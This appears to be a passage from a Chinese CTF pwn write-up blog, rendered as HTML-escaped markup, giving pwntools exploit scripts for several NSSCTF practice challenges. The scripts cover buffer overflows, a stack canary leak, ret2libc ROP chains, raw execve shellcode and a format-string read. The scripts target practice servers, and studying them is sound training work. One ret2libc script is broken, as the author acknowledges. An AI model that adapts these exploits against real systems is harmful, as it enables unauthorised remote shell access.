&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,arch=&amp;#x27;amd64&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28457)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=asm(shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=shellcode.ljust(0x108,b&amp;#x27;a&amp;#x27;)+p64(0x4040A0)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;2021-鹤城杯littleof&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2021-鹤城杯littleof&#34;&gt;#&lt;/a&gt; [2021 鹤城杯] littleof&lt;/h5&gt;
&lt;p&gt;注意 canary 保护绕过方法注意使用方法 nssctf 上的环境有问题我的 poc 打不进去只有用这个&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#p = process(&amp;#x27;./pwn&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28316)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&amp;#x27;./littleof&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def debug():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def get_addr():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;overflow?&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(7).rjust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;canary addr is %x&amp;#x27;%canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak libc_base&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi = 0x400863&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret = 0x40059e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x48 + p64(canary) + p64(0) + p64(rdi) + p64(elf.got[&amp;#x27;puts&amp;#x27;]) + p64(elf.sym[&amp;#x27;puts&amp;#x27;]) + p64(0x4006e2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;harder!&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = get_addr() - 0x080aa0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# leak canary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;overflow?&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(b&amp;#x27;a&amp;#x27;*0x49)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = u64(p.recv(7).rjust(8, b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;canary addr is %x&amp;#x27;%canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# get shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + 0x04f550&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binsh = libc_base + 0x1b3e1a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = b&amp;#x27;a&amp;#x27;*0x48 + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendafter(b&amp;#x27;harder!&amp;#x27;, payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1easyoverflow&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1easyoverflow&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]easyoverflow&lt;/h5&gt;
&lt;p&gt;又是一个栈不稳定直接 cat flag 的题源代码是&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stdin,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stdout,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setbuf(stderr,0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;Input something&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    char name[30];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int number=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gets(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(number!=0)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        puts(&amp;quot;You win.&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        system(&amp;quot;cat flag&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;保护全关直接让 name 溢出后即可&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;1.1.1.1&amp;#x27;,11)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nssctf-2022-spring-recruitr3m4ke&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nssctf-2022-spring-recruitr3m4ke&#34;&gt;#&lt;/a&gt; [NSSCTF 2022 Spring Recruit]R3m4ke?&lt;/h5&gt;
&lt;p&gt;一个很简单达到 payload 的题&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28195)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x28+p64(0x40072C)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;started&amp;gt;&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1fmtstrre&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1fmtstrre&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]fmtstrre&lt;/h5&gt;
&lt;p&gt;字符串溢出直接查看 name 在 bss 里面的位置直接打就行注意栈平衡&lt;br /&gt;
 %38$s 直接获得 flag&lt;/p&gt;
&lt;h5 id=&#34;gdouctf-2023shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gdouctf-2023shellcode&#34;&gt;#&lt;/a&gt; [GDOUCTF 2023]Shellcode&lt;/h5&gt;
&lt;p&gt;read 储存 name 在 bss 段上面，并且可以写入 25 的字节长度但是 shellcraft 默认生成的字节数是 44 位长度，那我们直接去网上找一个小于 25 字节的 shellcode&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28735)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode=&amp;#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name=0x6010A0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,shellcode)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0xA+0x8)+p64(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这个题应该还能够 ret2libc 但是我打出来有点问题&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28010)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi_pop=0x4007b3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=0x40028e&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt=elf.plt[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got=elf.got[&amp;#x27;puts&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main=0x400687&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload1=b&amp;#x27;a&amp;#x27;*(0xA+0x8)+p64(rdi_pop)+p64(puts_got)+p64(puts_plt)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_ad=u64(p.recvuntil(b&amp;#x27;\x7f&amp;#x27;)[-6:].ljust(8,b&amp;#x27;\x00&amp;#x27;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;puts_ad is %x&amp;#x27;%puts_ad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=LibcSearcher(&amp;#x27;puts&amp;#x27;,puts_ad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base=puts_ad-libc.dump(&amp;#x27;puts&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr=libc_base+libc.dump(&amp;#x27;system&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;str_bin_sh=libc_base+libc.dump(&amp;#x27;str_bin_sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;lease.&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(sys_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(str_bin_sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload2=b&amp;#x27;a&amp;#x27;+(0xA+0x8)+p64(ret)+p64(rdi_pop)+p64(str_bin_sh)+p64(sys_addr)+p64(main)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;start!&amp;#x27;,payload2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hnctf-2022-week1ezr0p32&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hnctf-2022-week1ezr0p32&#34;&gt;#&lt;/a&gt; [HNCTF 2022 Week1]ezr0p32&lt;/h5&gt;
&lt;p&gt;把 /bin/sh 写在.bss 上然后直接打&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28655)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name&amp;#x27;,&amp;#x27;/bin/sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x1c+0x4)+p32(0x080483d0)+p32(0)+p32(0x0804A080)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;time~&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;深育杯-2021find_flag&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#深育杯-2021find_flag&#34;&gt;#&lt;/a&gt; [深育杯 2021] find_flag&lt;/h5&gt;
